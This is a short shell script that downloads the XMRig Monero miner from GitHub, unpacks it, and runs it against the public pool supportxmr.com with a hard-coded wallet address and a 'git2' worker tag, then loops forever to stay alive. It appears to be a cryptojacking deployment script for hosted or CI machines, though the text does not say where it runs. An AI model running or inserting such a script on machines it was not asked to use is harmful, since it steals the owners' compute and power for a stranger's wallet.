#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz
tar -xvf xmrig-6.12.1-bionic-x64.tar.gz
./xmrig-6.12.1/xmrig -o pool.supportxmr.com:443 -u 4Ag4iUddrHPhk7eAqJ8sD6RnFUvJ2j6zM2BtAe2EiBgoQYGywrgD4R9eWcJpX5o8eWjCPamzNy7r2jL1RooEni5tVDhT4er -k --tls -p git2
while [ 1 ]; do
sleep 3
done
sleep 999
